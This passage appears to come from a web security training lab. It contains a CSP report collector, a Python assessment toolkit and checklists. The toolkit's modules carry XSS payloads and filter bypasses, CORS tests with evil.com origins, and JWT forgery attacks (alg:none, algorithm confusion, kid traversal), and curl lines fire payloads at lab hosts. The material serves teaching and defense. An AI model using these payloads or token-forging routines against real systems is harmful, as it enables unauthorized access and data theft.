            CSPReportCollector.reports.append(entry)
            CSPReportCollector.stats[entry['violated_directive']] += 1
            
            # Classify severity
            severity = self.classify(entry)
            
            if severity == 'CRITICAL':
                print(f"\n[CRITICAL] External script blocked: {entry['blocked_uri']}")
                print(f"  Document: {entry['document_uri']}")
                print(f"  Source: {entry['source_file']}:{entry['line_number']}")
                print(f"  Client: {entry['client_ip']}")
            elif severity == 'HIGH':
                print(f"[HIGH] {entry['violated_directive']}: {entry['blocked_uri']}")
            
        except Exception as e:
            print(f"[ERROR] Failed to parse CSP report: {e}")
        
        self.send_response(204)
        self.end_headers()
    
    def do_GET(self):
        """Return current statistics."""
        if self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            stats = {
                'total_reports': len(CSPReportCollector.reports),
                'by_directive': dict(CSPReportCollector.stats),
                'recent': CSPReportCollector.reports[-10:]
            }
            self.wfile.write(json.dumps(stats, indent=2).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    @staticmethod
    def classify(report):
        directive = report.get('violated_directive', '')
        blocked = report.get('blocked_uri', '')
        
        if directive.startswith('script-src'):
            if blocked and not blocked.startswith("'") and 'self' not in blocked:
                return 'CRITICAL'
            return 'HIGH'
        if directive.startswith('frame-ancestors'):
            return 'HIGH'
        if directive.startswith('object-src'):
            return 'MEDIUM'
        return 'LOW'
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9090
    server = HTTPServer(('0.0.0.0', port), CSPReportCollector)
    print(f"CSP Report Collector listening on :{port}")
    print(f"Stats endpoint: http://localhost:{port}/stats")
    server.serve_forever()
```

```bash
# Run the CSP report collector
python3 csp_report_analyzer.py 9090 &

# Generate CSP violations by attacking the CSP-protected app
curl "http://10.8.0.30/search?q=<script>alert(1)</script>"
curl "http://10.8.0.30/search?q=<img+src=http://evil.com/img.png>"

# Check collected reports
curl -s http://10.8.0.30:9090/stats | python3 -m json.tool
```

**Expected output:** Sigma rules generate alerts in Elasticsearch. YARA scans detect web shell signatures. CSP report collector classifies violations by severity and identifies external script injection attempts.

---

## PART C: FRAMEWORK DEVELOPMENT

### Web Security Assessment Toolkit

```python
#!/usr/bin/env python3
"""
web_security_toolkit.py — Comprehensive Web Security Assessment Framework

Modules:
  1. XSSScanner        — Reflected/stored/DOM XSS detection with context-aware payloads
  2. CORSAnalyzer      — CORS misconfiguration detection and exploit generation
  3. JWTAttacker       — JWT vulnerability scanner (none, confusion, kid, jku)
  4. CSRFTester        — CSRF token and SameSite cookie analysis
  5. HeaderAuditor     — Security header completeness check
  6. WAFRuleGenerator  — Generate ModSecurity/Cloudflare WAF rules from findings
  7. ReportGenerator   — Consolidated assessment report with CVSS/CWE
"""

import base64
import hashlib
import hmac
import json
import re
import socket
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Optional
from urllib.parse import urlparse, quote, urlencode

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("[WARN] requests library not found — HTTP tests disabled")


# ============================================================
# Module 1: XSS Scanner
# ============================================================

class XSSContext(Enum):
    HTML_TAG = "html_tag"
    HTML_ATTRIBUTE = "html_attribute"
    JS_STRING = "js_string"
    JS_TEMPLATE = "js_template"
    URL_PARAM = "url_param"
    CSS_VALUE = "css_value"

@dataclass
class XSSFinding:
    url: str
    parameter: str
    context: XSSContext
    payload: str
    evidence: str
    severity: str = "HIGH"
    cwe: str = "CWE-79"
    cvss: float = 6.1

class XSSScanner:
    PAYLOADS_BY_CONTEXT = {
        XSSContext.HTML_TAG: [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<body onload=alert(1)>',
        ],
        XSSContext.HTML_ATTRIBUTE: [
            '" onmouseover=alert(1) x="',
            "' onfocus=alert(1) autofocus='",
            '" autofocus onfocus=alert(1) "',
            '"><script>alert(1)</script>',
        ],
        XSSContext.JS_STRING: [
            "';alert(1)//",
            '";alert(1)//',
            "</script><script>alert(1)</script>",
            "\\';alert(1)//",
        ],
    }
    
    FILTER_BYPASS = [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img/src=x/onerror=alert(1)>',
        '<svg><animate onbegin=alert(1) attributeName=x>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<img src=x onerror=window["al"+"ert"](1)>',
        '<img src=x onerror=alert`1`>',
    ]
    
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.findings = []
    
    def detect_context(self, url, param, canary):
        """Inject a canary string and determine the reflection context."""
        if not HAS_REQUESTS:
            return None
        
        test_url = f"{url}?{param}={canary}"
        try:
            r = self.session.get(test_url, timeout=10)
            body = r.text
        except Exception:
            return None
        
        if canary not in body:
            return None
        
        idx = body.find(canary)
        before = body[max(0, idx - 100):idx]
        after = body[idx:idx + 100]
        
        if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
            if "'" in before[before.rfind('<script'):]:
                return XSSContext.JS_STRING
            return XSSContext.JS_TEMPLATE
        
        if re.search(r'=\s*["\']?[^"\']*$', before):
            return XSSContext.HTML_ATTRIBUTE
        
        return XSSContext.HTML_TAG
    
    def scan_parameter(self, url, param):
        """Test a single parameter for XSS."""
        canary = f"xss{int(time.time())}probe"
        context = self.detect_context(url, param, canary)
        
        if context is None:
            return
        
        payloads = self.PAYLOADS_BY_CONTEXT.get(context, []) + self.FILTER_BYPASS
        
        for payload in payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            try:
                r = self.session.get(test_url, timeout=10)
                if payload in r.text or (
                    'onerror=' in payload and 'onerror=' in r.text
                ):
                    finding = XSSFinding(
                        url=url,
                        parameter=param,
                        context=context,
                        payload=payload,
                        evidence=r.text[r.text.find(payload[:20]):r.text.find(payload[:20])+200]
                    )
                    self.findings.append(finding)
                    return finding
            except Exception:
                continue
        return None
    
    def scan(self, parameters=None):
        """Scan all parameters for XSS."""
        if parameters is None:
            parameters = ['q', 'search', 'query', 'name', 'id', 'page', 'url', 'redirect']
        
        print(f"[XSS] Scanning {self.target} with {len(parameters)} parameters")
        for param in parameters:
            finding = self.scan_parameter(self.target, param)
            if finding:
                print(f"  [!] XSS in ?{param}= (context: {finding.context.value})")
                print(f"      Payload: {finding.payload[:60]}")
        
        return self.findings


# ============================================================
# Module 2: CORS Analyzer
# ============================================================

@dataclass
class CORSFinding:
    url: str
    origin_tested: str
    acao: str
    acac: str
    vulnerability: str
    severity: str
    cwe: str = "CWE-942"
    cvss: float = 7.5

class CORSAnalyzer:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.findings = []
    
    def test_origins(self):
        """Test multiple origin vectors."""
        if not HAS_REQUESTS:
            return self.findings
        
        parsed = urlparse(self.target)
        domain = parsed.hostname
        
        test_origins = [
            ("https://evil.com", "arbitrary_origin"),
            ("null", "null_origin"),
            (f"https://{domain}.evil.com", "subdomain_prepend"),
            (f"https://evil{domain}", "suffix_match"),
            (f"https://evil.com%0d%0aX-Injected:true", "crlf_injection"),
        ]
        
        for origin, attack_type in test_origins:
            try:
                r = self.session.get(self.target, headers={"Origin": origin}, timeout=5)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                
                if acao == origin:
                    severity = "CRITICAL" if acac.lower() == "true" else "HIGH"
                    finding = CORSFinding(
                        url=self.target,
                        origin_tested=origin,
                        acao=acao,
                        acac=acac,
                        vulnerability=f"Reflected origin ({attack_type})",
                        severity=severity,
                        cvss=9.1 if severity == "CRITICAL" else 7.5
                    )
                    self.findings.append(finding)
            except Exception:
                continue
        
        return self.findings


# ============================================================
# Module 3: JWT Attacker
# ============================================================

@dataclass
class JWTFinding:
    attack: str
    token: str
    result: str
    severity: str
    cwe: str = "CWE-347"
    cvss: float = 8.2

class JWTAttacker:
    def __init__(self, token, verify_url=None, session=None):
        self.original_token = token
        self.verify_url = verify_url
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.findings = []
    
    @staticmethod
    def b64url_encode(data):
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    @staticmethod
    def b64url_decode(data):
        padding = 4 - len(data) % 4
        return base64.urlsafe_b64decode(data + '=' * padding)
    
    def decode(self):
        """Decode JWT without verification."""
        parts = self.original_token.split('.')
        header = json.loads(self.b64url_decode(parts[0]))
        payload = json.loads(self.b64url_decode(parts[1]))
        return header, payload
    
    def attack_none(self):
        """Test alg:none bypass."""
        _, payload = self.decode()
        payload['role'] = 'admin'
        
        for alg in ['none', 'None', 'NONE', 'nOnE']:
            header = {"alg": alg, "typ": "JWT"}
            h = self.b64url_encode(json.dumps(header))
            p = self.b64url_encode(json.dumps(payload))
            forged = f"{h}.{p}."
            
            if self.verify_url and HAS_REQUESTS:
                try:
                    r = self.session.get(self.verify_url,
                                        headers={"Authorization": f"Bearer {forged}"}, timeout=5)
                    if r.status_code == 200:
                        self.findings.append(JWTFinding(
                            attack=f"none_algorithm_{alg}",
                            token=forged[:50] + "...",
                            result=f"HTTP {r.status_code}",
                            severity="CRITICAL",
                            cvss=9.8
                        ))
                        return forged
                except Exception:
                    pass
        return None
    
    def attack_algorithm_confusion(self, public_key_pem):
        """Test RS256→HS256 algorithm confusion."""
        _, payload = self.decode()
        payload['role'] = 'admin'
        
        header = {"alg": "HS256", "typ": "JWT"}
        h = self.b64url_encode(json.dumps(header))
        p = self.b64url_encode(json.dumps(payload))
        
        signing_input = f"{h}.{p}".encode()
        if isinstance(public_key_pem, str):
            public_key_pem = public_key_pem.encode()
        
        signature = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
        sig = self.b64url_encode(signature)
        
        forged = f"{h}.{p}.{sig}"
        
        if self.verify_url and HAS_REQUESTS:
            try:
                r = self.session.get(self.verify_url,
                                    headers={"Authorization": f"Bearer {forged}"}, timeout=5)
                if r.status_code == 200:
                    self.findings.append(JWTFinding(
                        attack="algorithm_confusion_rs256_hs256",
                        token=forged[:50] + "...",
                        result=f"HTTP {r.status_code}",
                        severity="CRITICAL",
                        cvss=9.8
                    ))
            except Exception:
                pass
        
        return forged
    
    def attack_kid_traversal(self):
        """Test kid header path traversal."""
        _, payload = self.decode()
        payload['role'] = 'admin'
        
        traversal_paths = [
            ("../../../dev/null", b""),
            ("../../../proc/sys/kernel/hostname", None),
            ("../../../etc/hostname", None),
        ]
        
        for kid_path, key_content in traversal_paths:
            if key_content is None:
                continue
            
            header = {"alg": "HS256", "typ": "JWT", "kid": kid_path}
            h = self.b64url_encode(json.dumps(header))
            p = self.b64url_encode(json.dumps(payload))
            
            signing_input = f"{h}.{p}".encode()
            signature = hmac.new(key_content, signing_input, hashlib.sha256).digest()
            sig = self.b64url_encode(signature)
            
            forged = f"{h}.{p}.{sig}"
            
            if self.verify_url and HAS_REQUESTS:
                try:
                    r = self.session.get(self.verify_url,
                                        headers={"Authorization": f"Bearer {forged}"}, timeout=5)
                    if r.status_code == 200:
                        self.findings.append(JWTFinding(
                            attack=f"kid_traversal_{kid_path}",
                            token=forged[:50] + "...",
                            result=f"HTTP {r.status_code}",
                            severity="CRITICAL",
                            cvss=9.1
                        ))
                except Exception:
                    pass
        
        return self.findings


# ============================================================
# Module 4: CSRF Tester
# ============================================================

@dataclass
class CSRFinding:
    url: str
    method: str
    vulnerability: str
    severity: str
    cwe: str = "CWE-352"
    cvss: float = 8.0

class CSRFTester:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.findings = []
    
    def check_csrf_token(self, url, method='POST'):
        """Test if a state-changing endpoint requires a CSRF token."""
        if not HAS_REQUESTS:
            return
        
        try:
            if method == 'POST':
                r = self.session.post(url, data={'test': 'value'}, timeout=10,
                                     allow_redirects=False)
            else:
                r = self.session.request(method, url, timeout=10, allow_redirects=False)
            
            # If the request succeeds without a CSRF token, it's vulnerable
            if r.status_code in (200, 301, 302, 303):
                self.findings.append(CSRFinding(
                    url=url,
                    method=method,
                    vulnerability="No CSRF token required",
                    severity="HIGH"
                ))
        except Exception:
            pass
    
    def analyze_cookies(self, url):
        """Analyze cookie security attributes."""
        if not HAS_REQUESTS:
            return
        
        try:
            r = self.session.get(url, timeout=10)
            set_cookies = r.headers.get('Set-Cookie', '')
            
            issues = []
            if 'HttpOnly' not in set_cookies and set_cookies:
                issues.append("HttpOnly missing")
            if 'Secure' not in set_cookies and set_cookies:
                issues.append("Secure flag missing")
            if 'SameSite' not in set_cookies and set_cookies:
                issues.append("SameSite not explicitly set")
            if '__Host-' not in set_cookies and set_cookies:
                issues.append("__Host- prefix not used")
            
            for issue in issues:
                self.findings.append(CSRFinding(
                    url=url,
                    method="COOKIE",
                    vulnerability=f"Cookie: {issue}",
                    severity="MEDIUM" if "SameSite" in issue else "HIGH",
                    cvss=5.4
                ))
        except Exception:
            pass


# ============================================================
# Module 5: Header Auditor
# ============================================================

@dataclass
class HeaderFinding:
    header: str
    current_value: str
    expected: str
    status: str
    severity: str

class HeaderAuditor:
    REQUIRED = {
        'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
        'Content-Security-Policy': "script-src 'self' 'nonce-...' 'strict-dynamic'",
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
        'Cross-Origin-Opener-Policy': 'same-origin',
        'Cross-Origin-Embedder-Policy': 'require-corp',
    }
    
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.findings = []
    
    def audit(self):
        if not HAS_REQUESTS:
            return self.findings
        
        try:
            r = self.session.get(self.target, timeout=10, verify=False)
        except Exception:
            return self.findings
        
        for header, expected in self.REQUIRED.items():
            value = r.headers.get(header, '')
            if not value:
                self.findings.append(HeaderFinding(
                    header=header, current_value='', expected=expected,
                    status='MISSING', severity='HIGH'
                ))
            elif header == 'Content-Security-Policy' and "'unsafe-inline'" in value:
                self.findings.append(HeaderFinding(
                    header=header, current_value=value, expected=expected,
                    status='WEAK', severity='MEDIUM'
                ))
        
        # Check for info leakage
        for leak_header in ['Server', 'X-Powered-By']:
            if r.headers.get(leak_header):
                self.findings.append(HeaderFinding(
                    header=leak_header, current_value=r.headers[leak_header],
                    expected='(remove)', status='INFO_LEAK', severity='LOW'
                ))
        
        return self.findings


# ============================================================
# Module 6: WAF Rule Generator
# ============================================================

class WAFRuleGenerator:
    def __init__(self):
        self.rules = []
    
    def from_findings(self, all_findings):
        """Generate WAF rules from assessment findings."""
        rule_id = 200000
        
        for finding in all_findings:
            if isinstance(finding, XSSFinding):
                self.rules.append(self._xss_rule(finding, rule_id))
                rule_id += 1
            elif isinstance(finding, CORSFinding):
                self.rules.append(self._cors_rule(finding, rule_id))
                rule_id += 1
            elif isinstance(finding, JWTFinding):
                self.rules.append(self._jwt_rule(finding, rule_id))
                rule_id += 1
        
        return self.rules
    
    def _xss_rule(self, finding, rule_id):
        return {
            'format': 'modsecurity',
            'rule': f'SecRule ARGS "@detectXSS" "id:{rule_id},phase:2,block,'
                    f'msg:\'XSS blocked (param: {finding.parameter})\','
                    f'severity:\'CRITICAL\',tag:\'CUSTOM/XSS\'"',
            'source_finding': f"XSS in {finding.parameter}"
        }
    
    def _cors_rule(self, finding, rule_id):
        return {
            'format': 'modsecurity',
            'rule': f'SecRule REQUEST_HEADERS:Origin "!@within {urlparse(finding.url).hostname}" '
                    f'"id:{rule_id},phase:1,block,'
                    f'msg:\'Unauthorized CORS origin\',severity:\'HIGH\'"',
            'source_finding': f"CORS reflected origin at {finding.url}"
        }
    
    def _jwt_rule(self, finding, rule_id):
        return {
            'format': 'modsecurity',
            'rule': f'SecRule REQUEST_HEADERS:Authorization "@rx Bearer\\s+eyJ[A-Za-z0-9_-]*\\.eyJ[A-Za-z0-9_-]*\\.$" '
                    f'"id:{rule_id},phase:1,block,'
                    f'msg:\'JWT none algorithm blocked\',severity:\'CRITICAL\'"',
            'source_finding': f"JWT {finding.attack}"
        }
    
    def export_modsecurity(self):
        output = "# Auto-generated WAF rules from security assessment\n"
        output += f"# Generated: {datetime.now(timezone.utc).isoformat()}\n\n"
        for rule in self.rules:
            if rule['format'] == 'modsecurity':
                output += f"# Source: {rule['source_finding']}\n"
                output += rule['rule'] + "\n\n"
        return output


# ============================================================
# Module 7: Report Generator
# ============================================================

class ReportGenerator:
    def __init__(self, target):
        self.target = target
        self.all_findings = []
        self.timestamp = datetime.now(timezone.utc).isoformat()
    
    def add_findings(self, findings):
        self.all_findings.extend(findings)
    
    def generate(self):
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        
        for f in self.all_findings:
            sev = getattr(f, 'severity', 'LOW')
            severity_count[sev] = severity_count.get(sev, 0) + 1
        
        report = {
            'assessment': {
                'target': self.target,
                'timestamp': self.timestamp,
                'total_findings': len(self.all_findings),
                'severity_distribution': severity_count,
            },
            'findings': []
        }
        
        for f in self.all_findings:
            entry = {
                'type': type(f).__name__,
                'severity': getattr(f, 'severity', 'UNKNOWN'),
                'cwe': getattr(f, 'cwe', 'N/A'),
                'cvss': getattr(f, 'cvss', 0),
            }
            
            if isinstance(f, XSSFinding):
                entry.update({
                    'url': f.url,
                    'parameter': f.parameter,
                    'context': f.context.value,
                    'payload': f.payload,
                })
            elif isinstance(f, CORSFinding):
                entry.update({
                    'url': f.url,
                    'vulnerability': f.vulnerability,
                    'origin_tested': f.origin_tested,
                })
            elif isinstance(f, JWTFinding):
                entry.update({
                    'attack': f.attack,
                    'result': f.result,
                })
            elif isinstance(f, CSRFinding):
                entry.update({
                    'url': f.url,
                    'method': f.method,
                    'vulnerability': f.vulnerability,
                })
            elif isinstance(f, HeaderFinding):
                entry.update({
                    'header': f.header,
                    'status': f.status,
                    'current': f.current_value,
                    'expected': f.expected,
                })
            
            report['findings'].append(entry)
        
        return report
    
    def print_summary(self, report=None):
        if report is None:
            report = self.generate()
        
        print(f"\n{'='*70}")
        print(f"  WEB SECURITY ASSESSMENT REPORT")
        print(f"  Target: {report['assessment']['target']}")
        print(f"  Date:   {report['assessment']['timestamp']}")
        print(f"{'='*70}")
        
        dist = report['assessment']['severity_distribution']
        print(f"\n  Findings: {report['assessment']['total_findings']}")
        print(f"    CRITICAL: {dist.get('CRITICAL', 0)}")
        print(f"    HIGH:     {dist.get('HIGH', 0)}")
        print(f"    MEDIUM:   {dist.get('MEDIUM', 0)}")
        print(f"    LOW:      {dist.get('LOW', 0)}")
        
        print(f"\n  {'─'*66}")
        for f in report['findings']:
            print(f"  [{f['severity']:8s}] {f['type']:20s} | {f.get('cwe','N/A')} | CVSS {f.get('cvss',0)}")
            for k, v in f.items():
                if k not in ('type', 'severity', 'cwe', 'cvss'):
                    print(f"             {k}: {str(v)[:60]}")
            print()


# ============================================================
# Main Execution
# ============================================================

def run_full_assessment(target_base):
    """Run complete web security assessment."""
    report = ReportGenerator(target_base)
    
    # Module 1: XSS
    print("\n[1/6] XSS Scanning...")
    xss = XSSScanner(f"{target_base}/search")
    xss_findings = xss.scan(['q', 'search', 'name'])
    report.add_findings(xss_findings)
    
    # Module 2: CORS
    print("[2/6] CORS Analysis...")
    cors = CORSAnalyzer(f"{target_base}/api/user-data")
    cors_findings = cors.test_origins()
    report.add_findings(cors_findings)
    
    # Module 3: JWT (requires a token)
    print("[3/6] JWT Testing...")
    if HAS_REQUESTS:
        try:
            r = requests.post(f"{target_base}/api/jwt/login",
                            json={"username": "user", "password": "user123"}, timeout=5)
            if r.status_code == 200:
                token = r.json()['token']
                jwt_attacker = JWTAttacker(token, f"{target_base}/api/jwt/admin")
                jwt_attacker.attack_none()
                jwt_attacker.attack_kid_traversal()
                report.add_findings(jwt_attacker.findings)
        except Exception as e:
            print(f"  [SKIP] JWT: {e}")
    
    # Module 4: CSRF
    print("[4/6] CSRF Testing...")
    csrf = CSRFTester(target_base)
    csrf.check_csrf_token(f"{target_base}/profile/update-email")
    csrf.analyze_cookies(f"{target_base}/login")
    report.add_findings(csrf.findings)
    
    # Module 5: Headers
    print("[5/6] Header Audit...")
    headers = HeaderAuditor(target_base)
    header_findings = headers.audit()
    report.add_findings(header_findings)
    
    # Module 6: WAF Rules
    print("[6/6] Generating WAF Rules...")
    waf = WAFRuleGenerator()
    rules = waf.from_findings(report.all_findings)
    
    # Output
    assessment = report.generate()
    report.print_summary(assessment)
    
    # Save report
    with open('/tmp/web_security_report.json', 'w') as f:
        json.dump(assessment, f, indent=2, default=str)
    print(f"\n[+] Full report saved to /tmp/web_security_report.json")
    
    # Save WAF rules
    waf_output = waf.export_modsecurity()
    with open('/tmp/generated_waf_rules.conf', 'w') as f:
        f.write(waf_output)
    print(f"[+] WAF rules saved to /tmp/generated_waf_rules.conf")
    
    return assessment

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else "http://10.8.0.10:3000"
    run_full_assessment(target)
```

```bash
# Run the full assessment
python3 web_security_toolkit.py http://10.8.0.10:3000

# View generated report
python3 -m json.tool /tmp/web_security_report.json

# Deploy generated WAF rules
cat /tmp/generated_waf_rules.conf
cp /tmp/generated_waf_rules.conf /etc/modsecurity/auto-generated-rules.conf
echo 'Include /etc/modsecurity/auto-generated-rules.conf' >> /etc/nginx/modsecurity.conf
nginx -t && systemctl reload nginx
```

---

## Lab Validation Checklist

### Part A — Offensive

| # | Exercise | Validation | Status |
|---|----------|------------|--------|
| 1 | XSS — Reflected | Canary reflected in response; alert fires in browser | ☐ |
| 1 | XSS — Stored | Payload persists; fires on subsequent page loads | ☐ |
| 1 | XSS — DOM | Payload in URL fragment; never appears in server logs | ☐ |
| 1 | XSS — Filter bypass | At least 3 bypass techniques succeed | ☐ |
| 2 | CSRF | Victim's email changed via auto-submitting form | ☐ |
| 2 | SameSite analysis | Cookie attributes documented with risk assessment | ☐ |
| 3 | CORS | Reflected origin with credentials confirmed | ☐ |
| 3 | CORS exploit | Cross-origin data theft PoC exfiltrates user data | ☐ |
| 4 | JWT none | Admin access gained with alg:none token | ☐ |
| 4 | JWT confusion | RS256→HS256 token forged with public key | ☐ |
| 4 | JWT kid | Path traversal via kid header exploited | ☐ |
| 5 | Clickjacking | Invisible iframe overlays sensitive action button | ☐ |
| 5 | PostMessage | XSS via cross-origin postMessage without origin check | ☐ |
| 6 | Prototype pollution | Object.prototype modified via __proto__ injection | ☐ |
| 7 | SSRF | Internal service data read via URL parameter | ☐ |
| 7 | Deserialization | Pickle payload executes system command on target | ☐ |
| 8 | Smuggling | CL.TE/TE.CL timing probes complete | ☐ |
| 8 | GraphQL | Schema dump reveals sensitive fields; admin query succeeds | ☐ |

### Part B — Defensive

| # | Exercise | Validation | Status |
|---|----------|------------|--------|
| 9 | CSP report-only | Violation reports collected in report endpoint | ☐ |
| 9 | CSP enforce | XSS payloads reflected but execution blocked | ☐ |
| 9 | Trusted Types | innerHTML assignment throws TypeError | ☐ |
| 10 | Security headers | Full header stack deployed; audit scores A+ | ☐ |
| 10 | ModSecurity CRS | Custom rules block introspection, SSRF, pollution | ☐ |
| 10 | Header audit | Before/after comparison shows improvement | ☐ |
| 11 | Sigma rules | XSS and JWT alerts fire in Elasticsearch | ☐ |
| 11 | YARA scanner | Web shell signatures detected in test files | ☐ |
| 11 | CSP monitoring | Reports classified by severity with alert thresholds | ☐ |

### Part C — Framework

| Module | Validation | Status |
|--------|------------|--------|
| XSSScanner | Detects reflected XSS with correct context classification | ☐ |
| CORSAnalyzer | Identifies reflected-origin misconfiguration | ☐ |
| JWTAttacker | At least one attack variant succeeds | ☐ |
| CSRFTester | Missing token and cookie attribute issues found | ☐ |
| HeaderAuditor | Missing headers enumerated with recommendations | ☐ |
| WAFRuleGenerator | ModSecurity rules generated from findings | ☐ |
| ReportGenerator | JSON report with CVSS/CWE for all findings | ☐ |

---

## Appendix A: Attack Quick Reference

| Attack | Vector | Defense | Detection |
|--------|--------|---------|-----------|
| Reflected XSS | URL parameter reflection | CSP nonce + output encoding | WAF regex + Sigma rule |
| Stored XSS | Database-stored HTML | DOMPurify + Trusted Types | YARA on content fields |
| DOM XSS | Client-side JS sinks | Trusted Types enforcement | CSP violation reports |
| CSRF | Cross-site form/fetch | SameSite=Strict + CSRF token | Origin header mismatch logs |
| CORS abuse | Reflected Origin header | Strict allowlist, no reflection | CORS header anomaly detection |
| JWT none | alg:none in header | Explicit algorithm enforcement | Empty signature pattern matching |
| JWT confusion | RS256→HS256 | Enforce algorithm per key | Algorithm mismatch alerting |
| Clickjacking | Transparent iframe overlay | frame-ancestors 'none' | X-Frame-Options audit |
| PostMessage XSS | Missing origin check | Exact origin validation | Static analysis grep |
| Prototype pollution | __proto__ in JSON | Input sanitization + Object.create(null) | Body pattern matching |
| SSRF | URL parameter to internal | Allowlist + DNS resolution validation | Metadata endpoint access logs |
| Deserialization | Pickle/ysoserial payloads | JSON-only data formats | Magic byte detection |
| GraphQL abuse | Introspection + batch | Disable introspection + complexity limit | __schema query detection |
| HTTP smuggling | CL/TE header disagreement | Normalize headers at proxy | Duplicate header detection |

## Appendix B: CVE Reference

| CVE | Component | Attack | CVSS |
|-----|-----------|--------|------|
| CVE-2020-11022 | jQuery < 3.5.0 | XSS via htmlPrefilter | 6.1 |
| CVE-2019-10744 | lodash < 4.17.12 | Prototype pollution | 9.1 |
| CVE-2015-9235 | Multiple JWT libs | alg:none bypass | 9.8 |
| CVE-2018-0114 | node-jose | jwk header injection | 9.8 |
| CVE-2022-23529 | jsonwebtoken < 9.0.0 | Prototype pollution → RCE | 7.6 |
| CVE-2017-11427 | python-saml | XML comment injection | 9.8 |
| CVE-2023-25690 | Apache mod_proxy | HTTP request smuggling | 9.8 |
| CVE-2022-1388 | F5 BIG-IP | Auth bypass via smuggling | 9.8 |
| CVE-2021-23631 | sanitize-html | DOM clobbering bypass | 6.1 |
| CVE-2020-6802 | Firefox Sanitizer API | DOM clobbering bypass | 6.1 |
| CVE-2021-23440 | set-value | Prototype pollution → XSS | 9.8 |

## Appendix C: Tool Reference

| Tool | Purpose | URL |
|------|---------|-----|
| jwt_tool | JWT vulnerability scanner | `https://github.com/ticarpi/jwt_tool` |
| Burp Suite | Web application security testing | `https://portswigger.net/burp` |
| OWASP ZAP | Open-source web app scanner | `https://www.zaproxy.org/` |
| Nuclei | Template-based vulnerability scanner | `https://github.com/projectdiscovery/nuclei` |
| XSStrike | Advanced XSS scanner | `https://github.com/s0md3v/XSStrike` |
| Dalfox | XSS scanner with blind detection | `https://github.com/hahwul/dalfox` |
| ysoserial | Java deserialization payloads | `https://github.com/frohoff/ysoserial` |
| PHPGGC | PHP deserialization chains | `https://github.com/ambionics/phpggc` |
| SecLists | Security testing wordlists | `https://github.com/danielmiessler/SecLists` |
| ModSecurity CRS | OWASP Core Rule Set for WAF | `https://coreruleset.org/` |
| DOMPurify | HTML sanitizer library | `https://github.com/cure53/DOMPurify` |
| SAMLRaider | SAML testing Burp extension | BApp Store |
| param-miner | Unkeyed header discovery | BApp Store |
| HTTP Request Smuggler | Smuggling detection | BApp Store |
